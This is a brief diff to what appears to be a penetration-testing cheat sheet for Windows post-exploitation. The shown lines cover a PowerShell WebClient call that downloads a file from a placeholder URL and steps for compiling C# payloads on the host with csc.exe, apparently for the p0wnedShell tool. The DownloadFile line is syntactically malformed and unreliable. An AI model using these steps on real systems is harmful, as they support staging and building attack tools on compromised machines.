@@ -26,3 +26,8 @@ systeminfo (Download output and run windows exploit suggestor)
 
 $WebClient = New-Object System.Net.WebClient
 $WebClient.DownloadFile("http(s)://URL/file" || file:C:\path\file")
+cd \Windows\Microsoft.NET\Framework\v4.0.30319
+
+Client Side Complies:
+cd \Windows\Microsoft.NET\Framework\v{Version Number}
+csc.exe /unsafe /reference:{Call all in .cs File 1 ref arg per ref} /win32icon:C:\p0wnedShell\{ProjName}.ico /out:C:\{ProjName\Path}.{Extension}(ie exe or DLL) /platform:x86 "C:\{Proj location}\*.cs"
